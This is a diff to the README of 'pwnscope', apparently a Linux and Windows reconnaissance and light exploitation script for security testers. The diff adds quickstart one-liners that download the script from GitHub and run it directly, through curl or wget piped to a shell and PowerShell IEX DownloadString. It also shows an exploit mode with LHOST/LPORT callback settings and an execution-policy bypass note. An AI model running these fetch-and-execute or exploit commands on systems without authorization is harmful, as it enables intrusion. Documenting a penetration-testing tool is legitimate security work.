@@ -1,6 +1,7 @@
 # pwnscope
 
-![grafik](https://github.com/user-attachments/assets/36d0ef20-da06-463b-a16e-dd0867944c78)
+![grafik](https://github.com/user-attachments/assets/67b4e00f-d4b8-4dfa-8473-2268a8c9d73f)
+
 
 
 **pwnscope** is a lightweight Linux and Windows reconnaissance and minimal exploit toolkit script designed to help security professionals quickly gather system information and perform basic exploitation.
@@ -31,7 +32,33 @@ It's designed to run smarter and faster than other recon scripts yet. So just gi
 
 ---
 
-## Usage Linux (Windows same with *.ps1 extension instead)
+## Usage Linux
+
+### Quickstart
+
+```bash
+# curl , bash
+bash -c "$(curl -fsSL https://raw.githubusercontent.com/suuhm/pwnscope/refs/heads/main/pwnscope.sh) --short"
+
+# wget , sh
+sh -c "$(wget -qO- https://raw.githubusercontent.com/suuhm/pwnscope/refs/heads/main/pwnscope.sh) --short"
+```
+
+### Ultimative oneliner
+
+```bash
+URL="https://raw.githubusercontent.com/suuhm/pwnscope/refs/heads/main/pwnscope.sh"; \
+run_cmd() { \
+  [ $1 = "sh" ] && sh -c "$(wget -qO- $URL) --short"; \
+  [ $1 = "bash" ] && bash -c "$(wget -qO- $URL) --short"; \
+  [ $1 = "curl" ] && curl -fsSL $URL | sh -c "$(cat) --short"; \
+  [ $1 = "wget" ] && wget -qO- $URL | sh -c "$(cat) --short"; \
+}; \
+for cmd in sh bash curl wget; do \
+  command -v $cmd >/dev/null 2>&1 && echo "$cmd is installed" && run_cmd $cmd || echo "$cmd is not installed"; \
+done
+
+```
 
 ```bash
 # Display help and usage
@@ -47,7 +74,13 @@ It's designed to run smarter and faster than other recon scripts yet. So just gi
 LHOST=10.10.10.4 LPORT=4444 ./pwnscope.sh --exploit
 ```
 
-### Windows Powershell
+## Usage Windows (Powershell)
+
+### Quickstart
+
+```powershell
+powershell -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/suuhm/pwnscope/refs/heads/main/pwnscope-win.ps1'); & ./pwnscope.ps1 --short"
+```
 
 ```powershell
 # For bypass Set-ExecutionPolicy:
@@ -94,7 +127,7 @@ LISTEN   0      128         127.0.0.1:5432      0.0.0.0:*
 
 ## License
 
-MIT License — see the [LICENSE](LICENSE) file for details.
+Apache 2.0 License — see the [LICENSE](LICENSE) file for details.
 
 ---
 
